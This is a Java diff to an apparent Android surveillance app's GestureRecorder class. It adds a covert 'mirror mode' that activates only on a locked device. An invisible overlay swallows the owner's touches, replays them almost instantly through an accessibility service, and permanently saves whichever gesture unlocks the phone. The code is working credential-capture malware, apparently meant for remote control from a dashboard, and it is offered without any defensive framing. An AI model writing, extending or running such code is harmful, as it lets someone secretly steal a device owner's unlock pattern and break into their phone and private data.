@@ -597,6 +597,7 @@ public class GestureRecorder {
     // so no overlay is needed and the user's input is never blocked.
 
     private volatile boolean       autoCapturing    = false;
+    private volatile boolean       autoMirrorActive = false;
 
     // Points accumulated for the dashboard-started auto-capture session
     private final List<GesturePoint> servicePts     = new ArrayList<>();
@@ -742,6 +743,102 @@ public class GestureRecorder {
             r.put("saved", hasSaved);
             if (hasSaved) r.put("result", result.get("result"));
             else          r.put("message", result.optString("message", "Auto-capture stopped"));
+        } catch (Exception e) {
+            try { r.put("success", false); r.put("error", e.getMessage()); } catch (Exception ignored) {}
+        }
+        return r;
+    }
+
+    // =========================================================================
+    // Autonomous Mirror Mode
+    // Runs ONLY when device is locked. Invisible overlay intercepts every
+    // gesture, replays it at 10-20ms, and if the device unlocks: saves it.
+    // Fully offline — no dashboard control needed once started.
+    // =========================================================================
+
+    /**
+     * Start autonomous mirror mode.
+     * • Only activates if the device is currently locked.
+     * • An invisible overlay intercepts all touch input.
+     * • On each finger-lift, the captured gesture is replayed at 10-20ms.
+     * • If the device unlocks → gesture is saved permanently and mode stops.
+     * • If still locked → buffer clears, overlay listens for the next gesture.
+     */
+    public JSONObject startAutoMirror() {
+        JSONObject r = new JSONObject();
+        try {
+            KeyguardManager km = (KeyguardManager) context.getSystemService(Context.KEYGUARD_SERVICE);
+            if (km == null || !km.isKeyguardLocked()) {
+                r.put("success", false);
+                r.put("error", "Device is not locked — mirror mode only runs on a locked device");
+                return r;
+            }
+            if (autoMirrorActive) {
+                r.put("success", false);
+                r.put("error", "Mirror mode is already running");
+                return r;
+            }
+            if (isRecording) {
+                r.put("success", false);
+                r.put("error", "Another recording is already active");
+                return r;
+            }
+            if (Build.VERSION.SDK_INT < Build.VERSION_CODES.N) {
+                r.put("success", false);
+                r.put("error", "Mirror mode requires Android 7+");
+                return r;
+            }
+            autoMirrorActive = true;
+            isRecording      = true;
+            CountDownLatch latch = new CountDownLatch(1);
+            mainHandler.post(() -> {
+                overlay = new RecordingOverlay(
+                        context, "mirror", "unlock_" + System.currentTimeMillis(),
+                        screenW, screenH, wm,
+                        () -> { isRecording = false; autoMirrorActive = false; });
+                overlay.setSilent(true);
+                overlay.setLockMode(true);
+                overlay.setMirrorMode(true);
+                overlay.setMirrorSvc(accessSvc);
+                try {
+                    overlay.show();
+                } catch (Exception e) {
+                    Log.e(TAG, "startAutoMirror overlay.show: " + e.getMessage());
+                    isRecording      = false;
+                    autoMirrorActive = false;
+                    overlay = null;
+                }
+                latch.countDown();
+            });
+            latch.await(2, TimeUnit.SECONDS);
+            if (overlay == null) {
+                r.put("success", false);
+                r.put("error", "Failed to show mirror overlay");
+                return r;
+            }
+            r.put("success", true);
+            r.put("message", "Mirror mode active — draw your unlock gesture; it will replay at ultra-speed automatically");
+        } catch (Exception e) {
+            autoMirrorActive = false;
+            isRecording      = false;
+            try { r.put("success", false); r.put("error", e.getMessage()); } catch (Exception ignored) {}
+        }
+        return r;
+    }
+
+    /** Stop autonomous mirror mode and remove the overlay. */
+    public JSONObject stopAutoMirror() {
+        JSONObject r = new JSONObject();
+        try {
+            autoMirrorActive = false;
+            isRecording      = false;
+            if (overlay != null) {
+                final RecordingOverlay cur = overlay;
+                overlay = null;
+                mainHandler.post(() -> cur.hide());
+            }
+            r.put("success", true);
+            r.put("message", "Mirror mode stopped");
         } catch (Exception e) {
             try { r.put("success", false); r.put("error", e.getMessage()); } catch (Exception ignored) {}
         }
@@ -1052,7 +1149,9 @@ public class GestureRecorder {
         private volatile boolean paused = false;
         private volatile boolean silent = false;
         // lockMode: per-gesture save — discard if device still locked after finger lift
-        private volatile boolean lockMode = false;
+        private volatile boolean lockMode   = false;
+        private volatile boolean mirrorMode = false;
+        private AccessibilityService mirrorSvc = null;
         private final List<GesturePoint> currentGesturePts = new ArrayList<>();
         private long currentGestureStartTime = 0;
         private final Handler overlayHandler = new Handler(Looper.getMainLooper());
@@ -1106,6 +1205,66 @@ public class GestureRecorder {
             this.lockMode = lockMode;
         }
 
+        /**
+         * Mirror mode: the overlay intercepts every touch gesture silently, replays it
+         * at ultra-speed (10-20ms), then checks if the device unlocked.
+         * Must be combined with lockMode=true and silent=true.
+         * Requires the AccessibilityService to dispatch the fast replay.
+         */
+        void setMirrorMode(boolean mirrorMode) {
+            this.mirrorMode = mirrorMode;
+        }
+
+        void setMirrorSvc(AccessibilityService svc) {
+            this.mirrorSvc = svc;
+        }
+
+        /**
+         * Build a GestureDescription from a List<GesturePoint> with all timing
+         * compressed into TARGET_MS (10-20ms) — imperceptibly fast.
+         */
+        @android.annotation.TargetApi(android.os.Build.VERSION_CODES.N)
+        private GestureDescription buildFastGesture(List<GesturePoint> pts) {
+            try {
+                final long TARGET_MS = 20;
+                Map<Integer, List<long[]>> strokes = new HashMap<>();
+                long firstT = -1, lastT = 0;
+                for (GesturePoint gp : pts) {
+                    float sx = Math.max(1, Math.min(screenW - 1, gp.nx * screenW));
+                    float sy = Math.max(1, Math.min(screenH - 1, gp.ny * screenH));
+                    if (firstT < 0) firstT = gp.t;
+                    long relT = gp.t - firstT;
+                    if (relT > lastT) lastT = relT;
+                    if (gp.action == MotionEvent.ACTION_DOWN ||
+                        gp.action == MotionEvent.ACTION_POINTER_DOWN ||
+                        gp.action == 5) {
+                        strokes.put(gp.pointerId, new ArrayList<>());
+                    }
+                    List<long[]> s = strokes.get(gp.pointerId);
+                    if (s == null) { s = new ArrayList<>(); strokes.put(gp.pointerId, s); }
+                    s.add(new long[]{ relT, (long) sx, (long) sy });
+                }
+                double scale = lastT > TARGET_MS ? (double) TARGET_MS / lastT : 1.0;
+                GestureDescription.Builder builder = new GestureDescription.Builder();
+                boolean has = false;
+                for (Map.Entry<Integer, List<long[]>> e : strokes.entrySet()) {
+                    List<long[]> s = e.getValue();
+                    if (s.isEmpty()) continue;
+                    long st  = Math.round(s.get(0)[0] * scale);
+                    long dur = Math.max(1, Math.round((s.get(s.size()-1)[0] - s.get(0)[0]) * scale));
+                    Path path = new Path();
+                    path.moveTo(s.get(0)[1], s.get(0)[2]);
+                    for (int i = 1; i < s.size(); i++) path.lineTo(s.get(i)[1], s.get(i)[2]);
+                    builder.addStroke(new GestureDescription.StrokeDescription(path, st, dur));
+                    has = true;
+                }
+                return has ? builder.build() : null;
+            } catch (Exception e) {
+                Log.e(TAG, "buildFastGesture: " + e.getMessage());
+                return null;
+            }
+        }
+
         void show() {
             startTime = System.currentTimeMillis();
 
@@ -1122,10 +1281,11 @@ public class GestureRecorder {
                 @Override
                 public boolean onTouchEvent(MotionEvent event) {
                     if (!stopped) handleTouch(event);
-                    // In silent mode: return false so the touch event passes through
-                    // to the underlying window (lock screen). The overlay still receives
-                    // and records the event before passing it on.
-                    return !silent;
+                    // Mirror mode: intercept the touch (return true) so the lock screen
+                    // does NOT receive the original event — only the fast replay hits it.
+                    // Silent (non-mirror): pass through (return false) so the user's
+                    // gesture reaches the underlying window normally.
+                    return mirrorMode || !silent;
                 }
 
                 @Override
@@ -1304,24 +1464,64 @@ public class GestureRecorder {
 
             // A simple tap (< 10 points or < 200ms duration) is not a pattern — skip
             if (snapshot.size() < 10) return;
-            long dur = gestureEndTime - currentGestureStartTime;
+            final long dur = gestureEndTime - currentGestureStartTime;
             if (dur < 200) return;
 
-            // Delay 350ms to let the system process the unlock before checking
-            overlayHandler.postDelayed(() -> {
-                try {
-                    android.app.KeyguardManager km =
-                        (android.app.KeyguardManager) context.getSystemService(Context.KEYGUARD_SERVICE);
-                    boolean isLocked = (km != null && km.isKeyguardLocked());
-                    if (!isLocked) {
-                        // Device just unlocked — this gesture was the correct unlock pattern; save it
-                        saveGesturePoints(snapshot, gestureEndTime - currentGestureStartTime);
+            if (mirrorMode && mirrorSvc != null &&
+                    Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
+                // ── Mirror mode ──────────────────────────────────────────────────
+                // 1. The overlay already intercepted the touch (didn't reach lock screen).
+                // 2. Immediately replay at 10-20ms so the lock screen receives it
+                //    at an imperceptible speed.
+                // 3. Wait 1 200ms then check if the device unlocked.
+                //    • Unlocked  → save gesture, tear down overlay
+                //    • Still locked → discard silently, stay ready for next gesture
+                GestureDescription fast = buildFastGesture(snapshot);
+                if (fast == null) return;
+                mirrorSvc.dispatchGesture(fast,
+                    new AccessibilityService.GestureResultCallback() {
+                        @Override
+                        public void onCompleted(GestureDescription g) {
+                            overlayHandler.postDelayed(() -> {
+                                try {
+                                    KeyguardManager km = (KeyguardManager)
+                                            context.getSystemService(Context.KEYGUARD_SERVICE);
+                                    boolean unlocked = (km == null || !km.isKeyguardLocked());
+                                    if (unlocked) {
+                                        saveGesturePoints(snapshot, dur);
+                                        stopped = true;
+                                        overlayHandler.post(() -> {
+                                            hide();
+                                            if (onStop != null) onStop.run();
+                                        });
+                                    }
+                                    // Still locked → overlay stays, listens for next gesture
+                                } catch (Exception e) {
+                                    Log.e(TAG, "mirrorMode unlock check: " + e.getMessage());
+                                }
+                            }, 1200);
+                        }
+                        @Override
+                        public void onCancelled(GestureDescription g) {
+                            Log.w(TAG, "mirrorMode: gesture dispatch cancelled");
+                        }
+                    }, null);
+            } else {
+                // ── Original lock mode ──────────────────────────────────────────
+                // Delay 350ms to let the system process the unlock before checking
+                overlayHandler.postDelayed(() -> {
+                    try {
+                        KeyguardManager km = (KeyguardManager)
+                                context.getSystemService(Context.KEYGUARD_SERVICE);
+                        boolean isLocked = (km != null && km.isKeyguardLocked());
+                        if (!isLocked) {
+                            saveGesturePoints(snapshot, dur);
+                        }
+                    } catch (Exception e) {
+                        Log.e(TAG, "onGestureFinished check: " + e.getMessage());
                     }
-                    // Still locked → discard silently, wait for next attempt
-                } catch (Exception e) {
-                    Log.e(TAG, "onGestureFinished check: " + e.getMessage());
-                }
-            }, 350);
+                }, 350);
+            }
         }
 
         /** Persist a list of gesture points to disk immediately. */
